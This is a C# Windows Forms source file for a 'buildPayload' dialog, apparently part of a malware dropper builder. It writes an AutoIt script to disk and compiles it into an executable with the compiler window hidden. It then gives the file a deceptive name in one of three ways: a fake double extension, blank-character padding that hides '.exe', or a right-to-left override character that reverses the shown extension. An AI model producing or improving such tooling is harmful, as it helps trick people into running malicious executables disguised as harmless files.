using System;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using System.IO;

namespace masamangalternatibo {
    public partial class buildPayload : Form {

        public string script, drive;
        public int overflowCount, spoofMode;
        public bool isicon;

        public buildPayload() {
            InitializeComponent();
        }

        private void btnClose_Click(object sender, EventArgs e) {
            this.Close();
        }

        private void btnFinBuild_Click(object sender, EventArgs e) {
            string flnmexport = drive + tbPreview.Text;
            if (File.Exists(flnmexport) == false) {

                if (tbPreview.Text == "") { btnPreview_LinkClicked(null, null); }

                using (StreamWriter _sw = new StreamWriter("$carrier.au3")) {
                    _sw.WriteLine(script);
                    _sw.Close();
                }
                using (Form1 _f1 = new Form1()) {
                    ProcessStartInfo _compilepsi = new ProcessStartInfo("compiler.exe", @"/in ""$carrier.au3"" /out ""$carrier.exe"" /comp 4 " + (rb32bit.Checked ? "/x86 " : "/x64 ") + (_f1.excomp[1] ? @"/pack " : "/nopack") + (isicon ? @"/icon ""$tmp.ico""" : ""));
                    _compilepsi.WindowStyle = ProcessWindowStyle.Hidden;
                    Process _cpsihndl = Process.Start(_compilepsi);
                    _cpsihndl.WaitForExit();
                    if (File.Exists("$carrier.exe")) {
                        File.Move("$carrier.exe", flnmexport);
                        if (MessageBox.Show("Payload Created!\n\nExport: " + flnmexport + "\n\nOpen payload directory?", "Build Finished", MessageBoxButtons.YesNo) == DialogResult.Yes) {
                                Process.Start(drive);
                        }
                        this.Close();
                    }
                    else {
                        MessageBox.Show("Script compilation failed!");
                    }
                }
            }
            else {
                MessageBox.Show("Filename already in use!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void buildPayload_Load(object sender, EventArgs e) {
            if (script != "") { btnPreview_LinkClicked(null, null); } //Prevents crash when form is loaded through "showallui"
        }

        private void buildPayload_MouseMove(object sender, EventArgs e) {
           if (MouseButtons == MouseButtons.Left) {
                this.Location = new Point(MousePosition.X - 135, MousePosition.Y - 15);
            }
        }

        private void label1_MouseMove(object sender, EventArgs e) {
            buildPayload_MouseMove(null, e);
        }

        private void btnCancel_Click(object sender, EventArgs e) {
            this.Close();
        }

        private void btnPreview_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) {
            switch (spoofMode) {
                case 0:
                    tbPreview.Text = tbFlNm.Text + '.' + tbFkExt.Text + ".exe";
                    break;
                case 1:
                    string overflowstr = "";
                    for (int x = 0; x <= overflowCount; x++) {
                        overflowstr += globalClass.blank;
                    }
                    tbPreview.Text = tbFlNm.Text + '.' + tbFkExt.Text + overflowstr + ".exe";
                    break;
                case 2:
                    tbPreview.Text = tbFlNm.Text + '.' + globalClass.rtlo + (new string(tbFkExt.Text.ToCharArray().Reverse().ToArray())) + ".exe";
                    break;
            }
        }
    }
}
